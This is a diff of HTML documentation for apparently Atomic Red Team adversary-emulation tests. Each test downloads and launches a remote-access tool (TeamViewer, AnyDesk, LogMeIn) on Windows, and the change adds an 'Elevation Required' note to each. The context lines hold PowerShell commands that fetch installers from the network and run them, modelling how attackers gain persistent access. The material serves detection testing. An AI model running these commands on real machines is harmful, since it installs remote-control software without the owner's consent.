@@ -504,7 +504,8 @@
 <div class="section" id="atomic-test-1-teamviewer-files-detected-test-on-windows">
 <h3>Atomic Test #1 - TeamViewer Files Detected Test on Windows<a class="headerlink" href="#atomic-test-1-teamviewer-files-detected-test-on-windows" title="Permalink to this headline">¶</a></h3>
 <p>An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
@@ -525,7 +526,8 @@ Start-Process &#39;C:\Program Files (x86)\TeamViewer\TeamViewer.exe&#39;
 <div class="section" id="atomic-test-2-anydesk-files-detected-test-on-windows">
 <h3>Atomic Test #2 - AnyDesk Files Detected Test on Windows<a class="headerlink" href="#atomic-test-2-anydesk-files-detected-test-on-windows" title="Permalink to this headline">¶</a></h3>
 <p>An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
@@ -545,7 +547,8 @@ Start-Process $file1 /S;
 <div class="section" id="atomic-test-3-logmein-files-detected-test-on-windows">
 <h3>Atomic Test #3 - LogMeIn Files Detected Test on Windows<a class="headerlink" href="#atomic-test-3-logmein-files-detected-test-on-windows" title="Permalink to this headline">¶</a></h3>
 <p>An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
